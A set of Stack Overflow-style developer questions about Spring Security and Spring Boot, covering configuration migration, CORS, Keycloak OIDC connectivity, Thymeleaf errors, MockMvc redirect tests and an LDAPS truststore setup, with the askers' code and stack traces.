    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107)
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90)
    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82)
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
    at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323)
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224)
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233)
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191)
    at org.springframework.security.test.web.servlet.setup.SecurityMockMvcConfigurer$DelegateFilter.doFilter(SecurityMockMvcConfigurer.java:132)
    at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132)
    at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201)
</code></pre>
"
"<p>In newer versions of Spring Security, the WebSecurityConfigurerAdapter class has been deprecated and removed. What can replace it? I am teaching Spring Security using a video course, in the video course there is an old version of Spring Boot, or rather version 2.5.1, and I have version Spring Boot 3.2.3, how can I replace this piece of code so that it works the same way on the version I am using?
package ru.alishov.springcourse.FirstSecurityApp.config;</p>
<pre><code>import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.crypto.password.NoOpPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import ru.alishov.springcourse.FirstSecurityApp.services.PersonDetailsService;

@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter
{
    private final PersonDetailsService personDetailsService;

    @Autowired
    public SecurityConfig(PersonDetailsService personDetailsService)
    { this.personDetailsService = personDetailsService; }

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception
    { auth.userDetailsService(personDetailsService); }

    @Bean
    public PasswordEncoder getPasswordEncoder()
    { return NoOpPasswordEncoder.getInstance(); }
 }
</code></pre>
"
"<p>I'm building spring boot application and the issue i'm facing is that I cannot customize error response from CORS. Default message returned from (<a href=""https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/DefaultCorsProcessor.html"" rel=""nofollow noreferrer"">DefaultCorsProcessor</a>) is <code>Invalid CORS request</code>.
I would like to send whole object in JSON format.</p>
<p>This is my SecurityConfig:</p>
<pre><code>@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
@EnableMethodSecurity
public class SecurityConfig {

    private static final String[] WHITE_LIST_URL = {
            &quot;/api/auth/**&quot;
    };

    private final JwtAuthenticationFilter jwtAuthenticationFilter;

    private final AuthenticationProvider authenticationProvider;

    private final LogoutHandler logoutHandler;

    @Value(&quot;${application.email.secret-key}&quot;)
    private String secretKey;

    @Value(&quot;${application.email.salt}&quot;)
    private String salt;

    @Value(&quot;${application.frontend.url}&quot;)
    private String frontendUrl;

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .csrf(AbstractHttpConfigurer::disable) // TODO setup CSRF
                .cors(Customizer.withDefaults()) // TODO CORS response error message customization
                .authorizeHttpRequests(req -&gt;
                        req
                                .requestMatchers(WHITE_LIST_URL)
                                .permitAll()
                                .anyRequest()
                                .authenticated()
                )
                .sessionManagement(session -&gt; session.sessionCreationPolicy(STATELESS))
                .authenticationProvider(authenticationProvider)
                .addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)
                .logout(logout -&gt;
                        logout.logoutUrl(&quot;/auth/logout&quot;)
                                .addLogoutHandler(logoutHandler)
                                .logoutSuccessHandler((request, response, authentication) -&gt; SecurityContextHolder.clearContext())
                )
                .exceptionHandling(e -&gt; e.authenticationEntryPoint(unauthorizedEntryPoint()))
        ;

        return http.build();
    }

    @Bean
    public AuthenticationEntryPoint unauthorizedEntryPoint() {
        return (request, response, authException) -&gt; {
            ExceptionResponseDto exceptionResponseDto = new ExceptionResponseDto(
                    &quot;Unauthorized access. Please login in order to access this resource.&quot;,
                    HttpStatus.UNAUTHORIZED
            );
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
            response.setContentType(&quot;application/json&quot;);
            response.getWriter().write(new ObjectMapper().writeValueAsString(exceptionResponseDto));

        };
    }

    @Bean
    public TextEncryptor textEncryptor() {
        return Encryptors.text(secretKey, salt);
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(Collections.singletonList(frontendUrl));
        configuration.setAllowedMethods(Collections.singletonList(&quot;*&quot;));
        configuration.setAllowedHeaders(Collections.singletonList(&quot;*&quot;));
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/api/**&quot;, configuration);
        return source;
    }

}
</code></pre>
<p>I have tried adding this:</p>
<pre><code>@Component
    public class CustomWebMvcRegistrations implements WebMvcRegistrations {
        @Override
        public RequestMappingHandlerMapping getRequestMappingHandlerMapping() {
            RequestMappingHandlerMapping rhm = new RequestMappingHandlerMapping();
            rhm.setCorsProcessor(new DefaultCorsProcessor() {
                @Override
                protected void rejectRequest(ServerHttpResponse response) throws IOException {
                    // DO WHATEVER YOU WANT
                    super.rejectRequest(response);
                }
            });
            return rhm;
        }
    }
</code></pre>
<p>but it does not work. Didn't find any other answers online.</p>
"
"<p>I have a variation on this frequent problem that is not addressed by other Qs on this. I have a Spring Boot/Security etc (2.5.6 Boot, 5.5.3 Security, Java 17) serving a REST API and SPA code, using Keycloak 23 for authentication. Both servers are on the same machine (Wintel). I developed this configuring the hostname as localhost running HTTP, and everything worked fine; user was redirected to KC for login, JWT obtained, used for API, SPA code served. I changed to HTTPS and made a self-signed cert, the same cert, for KC and SB. I configged it and installed it in the right places. Again everything worked.</p>
<p>I changed the hostname in the KC and Spring Boot config to the actual name of the machine, and I got the familiar ResourceAccessException when Spring Security tried to configure itself getting the OIDC endpoints on KC. Here is part of the stack trace. Note that there is nothing about invalid cert or other such indication. The URL named in the exception is accessible via Curl and in the browser, returns the expected JSON. Chrome and FF do not complain about untrusted cert.</p>
<pre><code>Caused by: org.springframework.web.client.ResourceAccessException: I/O error on GET request for &quot;https://myhost:8443/realms/myrealm/.well-known/openid-configuration&quot;: Permission denied: connect; nested exception is java.net.SocketException: Permission denied: connect
        at org.springframework.web.client.RestTemplate.doExecute(RestTemplate.java:785) ~[spring-web-5.3.12.jar!/:5.3.12]
        at org.springframework.web.client.RestTemplate.exchange(RestTemplate.java:670) ~[spring-web-5.3.12.jar!/:5.3.12]
        at org.springframework.security.oauth2.client.registration.ClientRegistrations.lambda$oidc$0(ClientRegistrations.java:155) ~[spring-security-oauth2-client-5.5.3.jar!/:5.5.3]
        at org.springframework.security.oauth2.client.registration.ClientRegistrations.getBuilder(ClientRegistrations.java:208) ~[spring-security-oauth2-client-5.5.3.jar!/:5.5.3]
        ... 97 common frames omitted
Caused by: java.net.SocketException: Permission denied: connect
        at java.base/sun.nio.ch.Net.connect0(Native Method) ~[na:na]
        at java.base/sun.nio.ch.Net.connect(Net.java:579) ~[na:na]
</code></pre>
<p>Here is the Spring Boot config. The truststore is commented out; the JVM should read cacerts from the JDK. I tried putting cacerts on the classpath but no change. Cacerts contains the certificate that is in the keystore.</p>
<pre><code>server:
  port: 443
  ssl:
   enabled: true    
   keyStoreType: PKCS12
   key-store: classpath:myhost.p12
   key-store-password: mypass
   key-alias: myhost
   # JVM should read JDK truststore
   # trust store location
   # trust-store: classpath:cacerts
   # trust store password
   # trust-store-password: changeit
spring:
  security:
    oauth2:
      client:
        registration:
          #keycloak: 
          myclient:
            client-id: &quot;myclient&quot;
            authorization-grant-type: &quot;authorization_code&quot;          
            scope: &quot;openid&quot;
            provider: &quot;keycloak&quot;     
            authorization-endpoint: https://myhost:8443/realms/myrealm/protocol/openid-connect/auth
            redirect-uri: 'https://myhost:443'
            issuer-uri: https://myhost:8443/myrealm 
        provider:
          keycloak:
            user-name-attribute: preferred_username
            authorization-endpoint: https://myhost:8443/myrealm/protocol/openid-connect/auth
            authorization-uri: https://myhost:8443/myrealm/
            oidc-provider:  https://myhost:8443/myrealm/.well-known/openid-configuration 
            issuer-uri: https://myhost:8443/myrealm
            token-uri: https://myhost:8443/myrealm/protocol/openid-connect/token 
            user-info-uri: https://myhost:8443/myrealm/protocol/openid-connect/userinfo
            logout-uri: https://myhost:8443/myrealm/protocol/openid-connect/logout    
            
      resourceserver:
        jwt:   
          issuer-uri: https://myhost:8443/myrealm
          jwk-set-uri: https://myhost:8443/auth/myrealm/protocol/openid-connect/certs
</code></pre>
<p>Here is the Keycloak config. The keystore is the same file as on the classpath for the Boot app</p>
<pre><code># basic keystore--same file as in Spring Boot app
https-key-store-file=C:/Keycloak/keycloak-23.0.0/conf/certs/myhost.p12
https-key-store-password=mypass

# truststore--JDK truststore, used by JVM
https-trust-store-file=C:/Program Files/Java/jdk-17.0.1/lib/security/cacerts
https-trust-store-password=changeit
https-trust-store-type=jks

hostname=myhost
hostname-strict-https=true

</code></pre>
<p>The Keycloak client URIs are as permissible as possible.</p>
<p>Root URL: https://myhost:443
Valid redirect URIs: /*
Web origins: + *</p>
<p>I tried logging to get more info on the error. KC logging even TRACE seems to be mainly about its database (Progres). KC 23 uses Quarkus and I turned on Quarkus logging for HTTP, but only got successful requests, nothing about errors.</p>
<p>This occurs on a VPN if it matters. Is there some problem resolving the hostname? I've used nslookup and nbtstat on myhost, and see the results, and all my adapters and addresses, not sure what to think.</p>
<p>Thanks for any advice.</p>
<p>Later...</p>
<p>The problem appears to be mixing up IPv4 and IPv6 addresses. The unqualified name myhost is presented as v4 wrapped in v6 or something, which fails. One suggestion is to set these variables in the JVM</p>
<p>-Djava.net.preferIPv4Stack=true -Djava.net.preferIPv6Addresses=false</p>
<p>but it doesn't change the behavior. Another is to use the IP addr, which conflicts with certificate naming, or to use a fully qualified name (and changing the cert). I think the latter choice would work, except that I'm on a VPN, to a remote private domain.</p>
<p>The VPN connection gives me a virtual adapter, and puts an A record in the private domain's DNS, with an IP for the virtual adapter. The FQN of my machine, myhost.privatedomain.com, resolves to that IP, via the DNS of the private domain. That IP is on a different subnet from the rest of the private domain. In any case, from within the private domain, my Keycloak installation can be reached, <a href=""https://myhost.privatedomain.com:8443"" rel=""nofollow noreferrer"">https://myhost.privatedomain.com:8443</a>.</p>
<p>I am behind my ISP router (Verizon), which has DNS, DHCP and firewall. It gives me a DHCP address, different from the virtual adapter address. NSLOOKUP for myhost.privatedomain.com gives the  virtual adapter address, via the private domain DNS. I cannot reach the virtual adapter address from my machine.</p>
<p>I added an A record for myhost.privatedomain.com to the DNS in my Verizon router, and changed the preferred DNS on my virtual and physical adapters. The local DNS is apparently still bypassed for the private domain DNS, and the virtual adapter addr is returned, for myhost.privatedomain.com. When the VPN is off, the local DNS is used, and returns the local address, the DHCP addr from the Verizon router.</p>
<p>This aim is for the Spring Boot/Security app to contact the Keycloak server; the failure arises during Security configuration. This tangent is a long way around the block.</p>
"
"<p>I have these classes in my project:</p>
<pre class=""lang-java prettyprint-override""><code>@Getter
@Setter
@NoArgsConstructor
@AllArgsConstructor
@Entity
@Table(name = &quot;users&quot;)
public class UserEntity {

    public UserEntity(String firstName, String lastName, String email, String username, String password, String role) {
        this.firstName = firstName;
        this.lastName = lastName;
        this.email = email;
        this.username = username;
        this.password = password;
        this.role = role;
    }

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Integer id;

    @Column(nullable = false)
    private String firstName;

    @Column(nullable = false)
    private String lastName;

    @Column(nullable = false, unique = true)
    private String email;

    @Column(nullable = false, unique = true)
    private String username;

    @Column(nullable = false)
    private String password;

    @Column
    private String role;
}


public interface UserRepository extends JpaRepository&lt;UserEntity, Integer&gt; {

    UserEntity findByEmail(String email);
}

   
import com.PE.PresidentialElections.models.UserEntity;

public class UserEntityDetails implements UserDetails {
    private UserEntity user;

    public UserEntityDetails(UserEntity user) {
        this.user = user;
    }

    public String getFullName() {
        return user.getFirstName() + &quot; &quot; + user.getLastName();
    }

    @Override
    public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {
        return List.of(() -&gt; user.getRole());
    }

    @Override
    public String getPassword() {
        return user.getPassword();
    }

    @Override
    public String getUsername() {
        return user.getUsername();
    }

    @Override
    public boolean isAccountNonExpired() {
        return true;
    }

    @Override
    public boolean isAccountNonLocked() {
        return true;
    }

    @Override
    public boolean isCredentialsNonExpired() {
        return true;
    }

    @Override
    public boolean isEnabled() {
        return true;
    }
}

@Service
public class UserEntityDetailsService implements UserDetailsService {

    @Autowired
    private UserRepository userRepository;

    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        UserEntity user = userRepository.findByEmail(username);
        if (user == null) {
            throw new UsernameNotFoundException(&quot;user not found&quot;);
        }
        return new UserEntityDetails(user);
    }
}



public interface UserService {

    UserEntity save(UserDto userDto);
}


@Service
public class UserServiceImpl implements UserService {

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Autowired
    private UserRepository userRepository;

    @Override
    public UserEntity save(UserDto userDto) {
        UserEntity user = new UserEntity(userDto.getFirstName(), userDto.getLastName(), userDto.getEmail(),
                userDto.getUsername(), passwordEncoder.encode(userDto.getPassword()), userDto.getRole());
        return userRepository.save(user);
    }

}

   
//class for the dataTransferObject
@Getter
@Setter
@NoArgsConstructor
@AllArgsConstructor
public class UserDto {
    private Integer id;

    @NotEmpty
    private String firstName;

    @NotEmpty
    private String lastName;

    @NotEmpty
    private String email;

    @NotEmpty
    private String username;

    @NotEmpty
    private String password;

    @NotEmpty
    private String role;
}

//configuration class

 @Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Autowired
    UserEntityDetailsService userEntityDetailsService;

    @Bean
    public static PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.csrf(c -&gt; c.disable())
                .authorizeHttpRequests(request -&gt; request
                        .requestMatchers(&quot;/styles/**&quot;, &quot;/images/**&quot;).permitAll()
                        .requestMatchers(&quot;/&quot;, &quot;/loginPage&quot;, &quot;/registerPage&quot;, &quot;/PresidentialElections&quot;).permitAll()
                        .anyRequest().authenticated())
                .formLogin(form -&gt; form.loginPage(&quot;/&quot;).permitAll())
                .logout(logout -&gt; logout.logoutSuccessUrl(&quot;/logout&quot;).permitAll());
        return http.build();
    }
}

 //the controller class   
@Controller
public class AuthController {
    @Autowired
    UserDetailsService userDetailsService;

    @Autowired
    UserService userService;

    @GetMapping(&quot;/&quot;)
    public String homePage() {
        return &quot;loginPage&quot;;
    }

    @GetMapping(&quot;/PresidentialElections&quot;)
    public String appPage() {
        return &quot;PresidentialElections&quot;;
    }

    @GetMapping(&quot;/registerPage&quot;)
    public String register(@ModelAttribute(&quot;user&quot;) UserDto userDto) {
        return &quot;registerPage&quot;;
    }
    
    @PostMapping(&quot;/register/save&quot;)
    public String saveUser(@ModelAttribute(&quot;user&quot;) UserDto userDto, Model model) {
        userService.save(userDto);
        model.addAttribute(&quot;message&quot;, &quot;Registered Successfuly!&quot;);
        return &quot;registerPage&quot;;
    }
}
</code></pre>
<p>Every time I start the app, I have a lot of errors and I can't find the problem:</p>
<pre class=""lang-none prettyprint-override""><code>2024-03-11T01:05:55.251+02:00 ERROR 10620 --- [nio-8080-exec-9] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed: org.thymeleaf.exceptions.TemplateInputException: An error happened during template parsing (template: &quot;class path resource [templates/loginPage.html]&quot;)] with root cause

java.lang.IllegalArgumentException: Attribute name cannot be null or empty
    at org.thymeleaf.engine.AttributeName.&lt;init&gt;(AttributeName.java:51) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.HTMLAttributeName.&lt;init&gt;(HTMLAttributeName.java:76) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.HTMLAttributeName.forName(HTMLAttributeName.java:63) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.AttributeNames.buildHTMLAttributeName(AttributeNames.java:292) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]       
    at org.thymeleaf.engine.AttributeNames.access$300(AttributeNames.java:37) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.AttributeNames$AttributeNamesRepository.storeAttribute(AttributeNames.java:693) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.AttributeNames$AttributeNamesRepository.getAttribute(AttributeNames.java:607) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.AttributeNames.forHTMLName(AttributeNames.java:480) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.AttributeDefinitions$AttributeDefinitionRepository.storeAttribute(AttributeDefinitions.java:788) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.AttributeDefinitions$AttributeDefinitionRepository.getAttribute(AttributeDefinitions.java:677) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.AttributeDefinitions.forHTMLName(AttributeDefinitions.java:405) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]      
    at org.thymeleaf.engine.AttributeDefinitions.forName(AttributeDefinitions.java:336) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.engine.TemplateHandlerAdapterMarkupHandler.handleAttribute(TemplateHandlerAdapterMarkupHandler.java:492) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]
    at org.thymeleaf.templateparser.markup.InlinedOutputExpressionMarkupHandler$InlineMarkupAdapterPreProcessorHandler.handleAttribute(InlinedOutputExpressionMarkupHandler.java:360) ~[thymeleaf-3.1.2.RELEASE.jar:3.1.2.RELEASE]  
</code></pre>
"
"<p>I have such a test</p>
<pre class=""lang-java prettyprint-override""><code>@Test
@WithAnonymousUser
void givenNoAuthentication_whenEnteringMainPage_thenRedirectToLoginPage() throws Exception {
    mockMvc.perform(get(&quot;/&quot;)).andExpect(redirectedUrl(&quot;/login&quot;));
}
</code></pre>
<p>And I got assertion error like this:</p>
<pre><code>java.lang.AssertionError: Redirected URL expected:&lt;/login&gt; but was:&lt;http://localhost/login&gt;
Expected :/login
Actual   :http://localhost/login
</code></pre>
<p>What is more, I have another test similar to this one which tests if logged in user gets redirected to main page (&quot;/&quot;) after accessing /login and this test is working fine</p>
<pre class=""lang-java prettyprint-override""><code>@Test
@WithMockUser
void givenAuthentication_whenEnteringLoginPage_thenRedirectToMainPage() throws Exception {
    mockMvc.perform(get(&quot;/login&quot;)).andExpect(redirectedUrl(&quot;/&quot;));
}
</code></pre>
<p>Here is how my spring security config looks like</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity httpSecurity) throws Exception {
        return httpSecurity
            .authorizeHttpRequests(authorize - &gt; authorize
                .requestMatchers(&quot;/css/**&quot;).permitAll()
                .requestMatchers(&quot;/js/**&quot;).permitAll()
                .requestMatchers(&quot;/login&quot;).permitAll()
                .requestMatchers(&quot;/register&quot;).permitAll()
                .requestMatchers(&quot;/user/register&quot;).permitAll()
                .anyRequest().authenticated()
            )
            .formLogin(form - &gt; form
                .loginPage(&quot;/login&quot;)
                .defaultSuccessUrl(&quot;/&quot;, true)

            )
            .logout(logout - &gt; logout
                .logoutUrl(&quot;/logout&quot;)
                .logoutSuccessUrl(&quot;/login&quot;)
            )
            .build();
    }

    @Bean
    public static PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
</code></pre>
<p>How can I fix my first test, and why it doesnt't work when second test which is almost the same is working fine?</p>
<p>EDIT:
I managed to fix this by using <code>.endsWith(&quot;/login&quot;)</code> like so</p>
<pre class=""lang-java prettyprint-override""><code>MvcResult result = mockMvc.perform(get(&quot;/&quot;)).andReturn();
assertThat(result.getResponse().getRedirectedUrl()).endsWith(&quot;/login&quot;);
</code></pre>
<p>But I still don't understand why in this test redirect url contains hostname, and it other it doesn't</p>
"
"<p>Suppose <code>serverProperties</code> is injected <code>@ConfigurationProperties</code>, and <code>publicPatterns</code> is a property loaded from a <code>yml</code> file</p>
<pre class=""lang-java prettyprint-override""><code>    @Bean
    public SecurityWebFilterChain filterChain(ServerHttpSecurity http) {
        return http
                .authorizeExchange(exchanges -&gt; exchanges
                        .pathMatchers(serverProperties.getPublicPatterns().toArray(new String[0])).permitAll()
                        .anyExchange().authenticated())
                .build();
    }
</code></pre>
<p>I want to avoid forcing users of the app to necessarily declare any public patterns so I need some reasonable default. It couldn't be <code>Collections.emptyList()</code> because of this check in the Spring library:</p>
<pre class=""lang-java prettyprint-override""><code>// org.springframework.security.web.server.util.matcher.ServerWebExchangeMatchers

    public static ServerWebExchangeMatcher pathMatchers(HttpMethod method, PathPattern... pathPatterns) {
        List&lt;ServerWebExchangeMatcher&gt; matchers = new ArrayList&lt;&gt;(pathPatterns.length);
        for (PathPattern pathPattern : pathPatterns) {
            matchers.add(new PathPatternParserServerWebExchangeMatcher(pathPattern, method));
        }
        return new OrServerWebExchangeMatcher(matchers);
    }
</code></pre>
<pre class=""lang-java prettyprint-override""><code>    public OrServerWebExchangeMatcher(List&lt;ServerWebExchangeMatcher&gt; matchers) {
        Assert.notEmpty(matchers, &quot;matchers cannot be empty&quot;);
        this.matchers = matchers;
    }
</code></pre>
<p>Is this the way to go?</p>
<pre class=""lang-java prettyprint-override""><code>@Component
@ConfigurationProperties(prefix = &quot;my-app&quot;)
@Setter
@Getter
public class ServerProperties {
    private List&lt;String&gt; publicPatterns = List.of(&quot;/&quot; + UUID.randomUUID());
    // ...
}
</code></pre>
"
"<p>When I throw my custom exception (AccountNotActivatedException) in the loadUserByUsername method, Spring wraps it in an InternalAuthenticationServiceException. In general, almost any exception in this method is packaged into it.
The problem is that such an exception cannot be handled using @ExceptionHandler (or any other, because it wraps all exceptions in it) and it has its own behavior.
And I need to understand exactly what error the user encountered during authentication in order to display it on the view.
Each situation should have its own error text to indicate to the user what exactly is wrong.</p>
<p>And now, as I understand it, in case of an error, it simply passes the “error” parameter to the request and returns the login page, I can no longer interact with it.</p>
<pre><code>@Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {

        boolean accountNonExpired = true;
        boolean credentialsNonExpired = true;
        boolean accountNonLocked = true;

        User user = userRepository.findByUsername(username);

        if(user==null){
            throw  new UsernameNotFoundException(&quot;Unable to login. The email or password is incorrect&quot;);
        }
        if (!user.isEnabled()) {
            throw new AccountNotActivatedException(
                    &quot;This account is not activated. &quot; +
                            &quot;To complete the registration, follow the link in the letter that was sent to your email address. &quot; +
                            &quot;We also recommend you check the \&quot;Spam\&quot; category.&quot;
            );
        }
        return new org.springframework.security.core.userdetails.User(
                user.getUsername(),
                user.getPassword(),
                user.isEnabled(),
                accountNonExpired,
                credentialsNonExpired,
                accountNonLocked,
                Collections.singleton(user.getRole()));
    }
</code></pre>
<p>This is my Spring Configuration</p>
<pre><code>public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
   http
           .anonymous(AbstractHttpConfigurer::disable)
           .authorizeHttpRequests(authorize -&gt; authorize
                   .requestMatchers(PathRequest
                           .toStaticResources()
                           .atCommonLocations())
                   .permitAll()
                   .requestMatchers(&quot;/book/{bookId}/testResults&quot;)
                   .authenticated()
                   .anyRequest().permitAll())
           .formLogin(login -&gt;login
                   .loginPage(&quot;/login&quot;)
                   .defaultSuccessUrl(&quot;/&quot;)
                   .permitAll())
           .logout(logout -&gt;logout
                   .logoutUrl(&quot;/logout&quot;)
                   .logoutSuccessUrl(&quot;/login&quot;)
                   .invalidateHttpSession(true)
                   .deleteCookies(&quot;JSESSIONID&quot;)
                   .permitAll());
                /*.oauth2Login( oauth2-&gt;oauth2
                        .loginPage(&quot;/login&quot;));*/
                      /*  .defaultSuccessUrl(&quot;/&quot;)
                        .userInfoEndpoint(userInfo-&gt; userInfo
                                .oidcUserService(oidcUserService())));*/
   return http.build();
}
</code></pre>
<p>P.S. I would also like to ask if it is true that Spring itself checks the login/password without me or should I do it myself, accept data from the form and access the database and check this data using the controller method.
Now I just use the Post method to transfer information to the /login endpoint and do not have PostMapping for this resource</p>
"
"<p>Its a java web application for LDAP, i am implementing LDAPS, so when adding self signed cert ssl certificate i am facing this issue.</p>
<p>keytool -genkeypair -keyalg RSA -keysize 2048 -alias localhost -keystore keystore.jks -storepass your_password -validity 365 -keypass your_password -dname &quot;CN=localhost&quot;</p>
<p>keytool -export -alias localhost -keystore keystore.jks -file localhost.crt -storepass your_password</p>
<p>keytool -import -trustcacerts -alias localhost -file localhost.crt -keystore keystorename.jks -storepass
your_password</p>
<p>keystore is created in src/main/resources</p>
<p>spring application yml file
ldap:
urls: ldaps://localhost:10636
base: uid=admin,ou=system
username: uid=admin
password: your_password
base-environment:
javax.net.ssl.trust-store: classpath:keystorename.jks
javax.net.ssl.trust-store-password: changeit
javax.net.ssl.trust-store-type: JKS
javax.net.ssl.trust-store-provider: SUN
javax.net.ssl.trust-store-alias: localhost</p>
<pre><code>String Keystore = &quot;[redacted]&quot;;
System.setProperty(&quot;javax.net.ssl.trustStore&quot;, Keystore);
System.setProperty(&quot;javax.net.ssl.trustStoreType&quot;, &quot;JKS&quot;);
System.setProperty(&quot;javax.net.ssl.trustStorePassword&quot;, &quot;changeit&quot;);
System.setProperty(&quot;javax.net.debug&quot;, &quot;ssl,handshake&quot;);

</code></pre>
<pre><code>
